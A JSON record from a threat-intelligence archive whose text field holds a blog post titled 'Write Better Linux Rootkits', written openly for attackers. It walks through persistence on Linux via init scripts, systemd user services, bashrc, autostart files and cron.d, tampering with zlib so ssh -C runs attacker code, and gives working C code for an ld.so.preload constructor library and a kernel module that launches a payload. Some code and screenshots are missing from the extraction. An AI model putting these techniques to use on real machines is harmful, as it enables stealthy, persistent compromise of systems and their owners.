@@ -1,0 +1,80 @@
+{
+    "id": "249ed0fc-eb74-4d3b-badb-8cb79d2bb690",
+    "created_at": "2023-03-03T02:05:44.700263Z",
+    "updated_at": "2025-03-27T02:16:25.523479Z",
+    "deleted_at": null,
+    "sha1_hash": "d6ec719db4c3917282797ed2d4f2929dfe2c0781",
+    "title": "2018-10-01 - Write Better Linux Rootkits",
+    "authors": "",
+    "file_creation_date": "2023-02-21T21:58:15Z",
+    "file_modification_date": "2023-02-21T21:58:15Z",
+    "file_size": 992949,
+    "plain_text": "# Write Better Linux Rootkits\n\n**jm33.me/write-better-linux-rootkits.html**\n\n[有个中文版在Freebuf，需要的可以去看看](https://www.freebuf.com/column/188100.html)\n\n## dig deeper into user space\n\n### lets abuse inits\n\n**the INIT**\n\n\nNovember 1, 2018\n\n\na lot of script kiddies know how to write their own SysV service file or modify the existing\nones, fortunate for them, SysVinit is still widely supported in Linux world. Debian family\n[choose to keep their SysVinit compatability, which is also why systemd-sysv exists, thus,](https://packages.debian.org/search?keywords=systemd-sysv)\nUbuntu inherited this shit too.\n\n\n-----\n\n[for Ubuntu, things can be quite complicated, it historically used upstart,](http://upstart.ubuntu.com/) [switched to systemd](https://wiki.ubuntu.com/SystemdForUpstartUsers)\nfrom 15.04, then dropped upstart and became more like Debian.\n\nheres a screenshot for INIT on Ubuntu 18.04:\n\nalmost forgot the rootkit part...\n\nyea, for most of the cases, we use SysV style service file, which, is basically shell scripts, you\ncan find them in many devices, include IoT ones:\n\n\n-----\n\n```\n#!/bin/sh\n\n# all comments have been removed\n\nPATH=/bin:/usr/bin:/sbin:/usr/sbin\n\nDESC=\"cron daemon\"\n\nNAME=cron\n\nDAEMON=/usr/sbin/cron\n\nPIDFILE=/var/run/crond.pid\n\nSCRIPTNAME=/etc/init.d/\"$NAME\"\n\ntest -f $DAEMON || exit 0\n\n. /lib/lsb/init-functions # wow, why not put our evil functions in this?\n\n[ -r /etc/default/cron ] && . /etc/default/cron\n\nparse_environment() {\n\n  for ENV_FILE in /etc/environment /etc/default/locale; do\n\n    [ -r \"$ENV_FILE\" ] || continue\n\n    [ -s \"$ENV_FILE\" ] || continue\n\n    for var in LANG LANGUAGE LC_ALL LC_CTYPE; do\n\n      value=$(egrep \"^${var}=\" \"$ENV_FILE\" | tail -n1 | cut -d= -f2)\n\n      [ -n \"$value\" ] && eval export $var=$value\n\n      if [ -n \"$value\" ] && [ \"$ENV_FILE\" = /etc/environment ]; then\n\n        log_warning_msg \"/etc/environment has been deprecated for locale\ninformation; use /etc/default/locale for $var=$value instead\"\n\n      fi\n\n    done\n\n  done\n\n  # Get the timezone set.\n\n  if [ -z \"$TZ\" -a -e /etc/timezone ]; then\n\n    TZ=$(cat /etc/timezone)\n\n  fi\n\n}\n\n# Parse the system's environment\n\nif [ \"$READ_ENV\" = \"yes\" ]; then\n\n  parse_environment\n\nfi\n\ncase \"$1\" in\n\nstart)\n\n  log_daemon_msg \"Starting periodic command scheduler\" \"cron\" # we can modify this\nfunction, without bringing too much attention\n\n  start_daemon -p $PIDFILE $DAEMON $EXTRA_OPTS\n\n  log_end_msg $?\n\n  ;;\n\nstop)\n\n```\n\n-----\n\n```\n  log_daemon_msg Stopping periodic command scheduler cron\n\n  killproc -p $PIDFILE $DAEMON\n\n  RETVAL=$?\n\n  [ $RETVAL -eq 0 ] && [ -e \"$PIDFILE\" ] && rm -f $PIDFILE\n\n  log_end_msg $RETVAL\n\n  ;;\n\nrestart)\n\n  log_daemon_msg \"Restarting periodic command scheduler\" \"cron\"\n\n  $0 stop\n\n  $0 start\n\n  ;;\n\nreload | force-reload)\n\n  log_daemon_msg \"Reloading configuration files for periodic command scheduler\"\n\"cron\"\n\n  # cron reloads automatically\n\n  log_end_msg 0\n\n  ;;\n\nstatus)\n\n  status_of_proc -p $PIDFILE $DAEMON $NAME && exit 0 || exit $?\n\n  ;;\n\n*)\n  log_action_msg \"Usage: /etc/init.d/cron {start|stop|status|restart|reload|forcereload}\"\n\n  exit 2\n\n  ;;\n\nesac\n\nexit 0\n\n```\nif we were going to inplement our lovely rootkit in this service, please read the above code\ncarefully\n\nan example here:\n\n\n-----\n\nput it to:\n```\n/etc/init.d\n\n/etc/rc[runlevel].d\n\n/etc/rc.local\n\n\n```\nyou will need root for this\n\n[for systemd, we can do this without root, thats where systemd/User comes in](https://wiki.archlinux.org/index.php/Systemd/User)\n\npossible service file locations:\n```\n/etc/systemd/system\n\n/etc/systemd/user\n\n/lib/systemd/system\n\n/lib/systemd/user\n\n~/.local/share/systemd/user\n\n~/.config/systemd/user\n\n\n```\nwrite service file like this:\n```\n[Unit]\n\nDescription=Music Player Daemon\n\n[Service]\n\nExecStart=/tmp/evil hello_from_systemd_user\n\n[Install]\n\nWantedBy=default.target\n\n\n```\nuse `systemctl --user enable service for user services,` `systemctl enable service`\nis for system-wide service\n\n**bashrc**\n\nvery handy as well!\n\nbash shell is frequently executed, which means bashrc files are, too\n\nthere are some files you might love:\n```\n/etc/profile\n\n~/.bashrc\n\n~/.bash_profile\n\n~/.bash_logout\n\n\n```\njust add something like\n```\n/tmp/evil hello_from_bashrc\n\n\n```\nthats it\n\n\n-----\n\n**xinitrc**\n\nyou probably wont believe this, but quite a lot linux servers have Xorg installed (coz they\nwant GUI), the most used distro for those admins, is CentOS6 with Gnome2\n\n**other RCs**\n\nmany programs have their own RC file for init config purposes, such as VIM\n\nthey exec code in RCs, and the RCs can be placed under `~, lets abuse VIM:`\n\n### abuse GUI/DE\n\nmost linux servers dont have any GUI installed, thus dont need to worry about this part. but\nlike i said, there are plenty of boxes have Gnome (mostly CentOS/RHEL), i guess knowing a\nlittle bit about linux desktop can help you make better use of these\n\n**XDG autostart for system**\n\nput a desktop file to `/etc/xdg/autostart and it will be executed on DE boot:`\n\n**XDG autostart for user**\n\nlikewise, put the above file to `~/.config/autostart and it will be executed on user login`\n\n### our favorite -- crond\n\nits indeed script kids' favorite, coz its as straight forward as Windows's schedule task.\nhowever its also well known to sys admins :(\n\nso, lets put our job to some hidden places like `/etc/cron.d insead of` `/var/spool/cron`\n\nim sure everybody knows how to write a cron job:\n\n\n-----\n\n### replacing files\n\nit can be done in many ways, here im going to show you some source code tampering trick\n\ntake openssh as an example, we can download its source and modify some function\n```\nuncompress_buffer() will only be used when ssh -C is specified, emmm, so be it, it is\n\n```\nthe one\n\nwhen needed, use `ssh -C target and the target will run our evil function`\n\n\n-----\n\nwe can patch existing binaries with our shellcode, without having to recompile the whole\n[project. theres a tool called backdoor-factory can help you with that](https://github.com/secretsquirrel/the-backdoor-factory)\n\nplus, if we are in a git/svn server, make use of the source code it hosts, modify its `Makefile`\nor `configure or something else useful. through which, you have a chance running your`\ncode in a mass scale of targets, or worst, just run it on the git/svn build server\n\n### abuse dynamic libs\n\nthe use dynamic libs is very common, simply put, libs contain all the functions an executable\ncalls, which means we can add our own code and get executed too\n\n**replace it**\n\nmost of the cases, we dont patch existing SOs (shared object), to add our code, we need to\nrecompile the lib\n\nto find a lib to tamper with, we use `ldd to reveal its links to every dynamic lib:`\n\n\n-----\n\nhere, we play with `libz.so.1, coz its a lot like the example in previous part`\n```\nlibz.so.1 comes from zlib, you can check it with your package manager:\n\n```\ndownload openssh portable 7.9 source, grep search `zlib keyword, we can easily find some`\ncode resides in `packet.c :`\n\nnow we change zlib's code, add `system() to` `inflate() function (which is located in`\n```\ninflate.c ):\n\n```\nbuild zlib and use the modified `libz.so* to replace the legit ones in target system, and run`\n```\nssh -C to trigger our code:\n\n```\n\n-----\n\n**NOTE as dynamic libs, their functions get called frequently by ELFs, we better not add**\noverhead to our code. and BEWARE, what if some external ELF we call in our lib code calls\nback? that would be a disaster\n\n**ld.so.preload**\n\nthats what script kids use, yes, according to `ld.so 's manual,` `ld.so handles every`\nELF/a.out in Linux,\n\nThe program ld.so handles a.out binaries, a format used long ago;\nld-linux.so* (/lib/ldlinux.so.1 for libc5, /lib/ld-linux.so.2 for glibc2) handles ELF,\nwhich everybody has been using\nfor years now.\nOtherwise, both have the same behavior, and use the same support files and\nprograms as ldd(1), ldconfig(8),\nand /etc/ld.so.conf.\n\nexcept for statically linked ELFs, which has their own `ld.a bundled with everything else`\n\nto load a lib before `ld.so handles any ELFs, we put our lib into` `/etc/ld.so.preload, or`\nset `LD_PRELOAD=/path/to/libwhatever.so, the latter, is more stealth`\n\nour lib is named `libevil.so`\n\nas a lib, it cant just get executed, it needs to be called. but what fucking ELF would call our\n```\nlibevil ??? no worries, we can use something like DllMain, its provided by GCC:\n\n```\nhere comes our code:\n\n\n-----\n\n```\n#include <stdio.h>\n\n#include <unistd.h>\n\nstatic void __attribute__((constructor))\n\nlib_init(void);\n\nstatic void lib_init(void)\n\n{\n\n  int pid = fork();\n\n  if (pid == 0) {\n\n    execl(\"/tmp/evil\", \"/tmp/evil\", \"hello_from_evil\\n\", (char*)NULL);\n\n  }\n\n  puts(\"evil lib initialized\");\n\n  return;\n\n}\n\n```\nand the `Makefile :`\n```\nall:\n\n    gcc -Wall -fPIC -shared -o libevil.so evil.c -ldl\n\nclean:\n\n    rm -f libevil.so *main*\n\n\n```\nmake it and upload to target, test it out:\n\n\n-----\n\n**NOTE** `libevil.so gets run before any ELFs, therefore we cant call anything dynamic, to`\nprevent boom. also, `execl() doesnt return unless it gets an error, which means`\n```\nlibevil.so will exit its current process before any ELF acutally gets run, resulting in an\n\n```\nunusable system\n\nbtw, `system() always call` `/bin/sh, thus cant be used in our` `libevil.so`\n\nso, why not write our rootkit entirely in libs?\n\n## make use of kernel space\n\n### LKM\n\nlinux can load unverified kernel modules on the fly, sounds cool huh?\n\nwriting LKMs is easier than it looks, just write a `Makefile first, you will know when you see`\nit:\n```\nobj-m += temp.o\n\nall:\n\n    make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) modules\n\nclean:\n\n    make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) clean\n\n\n```\nand the LKM code comes in:\n\n\n-----\n\n```\n#include <linux/kernel.h>\n\n#include <linux/kmod.h>\n\n#include <linux/module.h>\n\nMODULE_LICENSE(\"GPL\"); // if not specified, the kernel is gonna complain\n\nstatic int cmd(char* argv[], char* envp[])\n\n/* execute shell commands */\n\n{\n\n  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC); // this is how we\nexecute something\n\n  // envp is useful as it provides env var support\n\n  printk(\"exec cmd %s\\n\", *argv);\n\n  return 0;\n\n}\n\nstatic int init_mod(void)\n\n/*module setup*/\n\n{\n\n  char* shell[] = { \"/tmp/evil\", \"hello_from_lkm\", NULL };\n\n  cmd(shell, NULL);\n\n  printk(\"initialized module\\n\");\n\n  return 0;\n\n}\n\nstatic void cleanup_mod(void)\n\n/*module shutdown*/\n\n{\n\n  char* shell[] = { \"/bin/rm\", \"/tmp/evil.log\", NULL };\n\n  cmd(shell, NULL);\n\n  printk(\"module removed\\n\");\n\n  return;\n\n}\n\n/* specify init and exit method */\n\nmodule_init(init_mod);\n\nmodule_exit(cleanup_mod);\n\n```\nsimply put, you need `module_init() and` `module_exit(), with your custom` `int`\n```\ninit(void) abd void exit(void) as args\n\n```\n[add a GPL lisence, hail FSF!](https://www.gnu.org/licenses/gpl-3.0.en.html)\n\nafter building the LKM, `insmod helps you load the module,` `rmmod does the opposite`\n\nlets load it and see:\n\n\n-----\n\n### no one seems to care about initrd\n\n\n-----\n\nyou can write LKM to `/etc/rc.modules or something to load your LKM on boot, but`\ntheres a better way to do that\n\nyes initrd helps a lot\n\n[if you dont understand the way linux boots itself, go to this article](https://wiki.debian.org/initramfs)\n\nfor Kali Rolling (Linux 4.18), we have the following demo:\n\n## thats it, thank you guys for being here. if you need, heres the Chinese version\n\n Comments\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Linux/Kernel Mode/2018-10-01 - Write Better Linux Rootkits.pdf"
+    ],
+    "report_names": [
+        "2018-10-01 - Write Better Linux Rootkits.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
+            "created_at": "2022-10-25T16:07:24.471018Z",
+            "updated_at": "2025-03-27T02:02:10.24394Z",
+            "deleted_at": null,
+            "main_name": "Cron",
+            "aliases": [],
+            "source_name": "ETDA:Cron",
+            "tools": [
+                "Catelites",
+                "Catelites Bot",
+                "CronBot",
+                "TinyZBot"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
+            "created_at": "2024-11-01T02:00:52.756877Z",
+            "updated_at": "2025-03-27T02:00:55.544216Z",
+            "deleted_at": null,
+            "main_name": "Play",
+            "aliases": null,
+            "source_name": "MITRE:Play",
+            "tools": [
+                "Nltest",
+                "AdFind",
+                "PsExec",
+                "Wevtutil",
+                "Cobalt Strike",
+                "Playcrypt",
+                "Mimikatz"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1677809144,
+    "ts_updated_at": 1743041785,
+    "ts_creation_date": 1677016695,
+    "ts_modification_date": 1677016695,
+    "files": {
+        "pdf": "https://archive.orkl.eu/d6ec719db4c3917282797ed2d4f2929dfe2c0781.pdf",
+        "text": "https://archive.orkl.eu/d6ec719db4c3917282797ed2d4f2929dfe2c0781.txt",
+        "img": "https://archive.orkl.eu/d6ec719db4c3917282797ed2d4f2929dfe2c0781.jpg"
+    }
+}
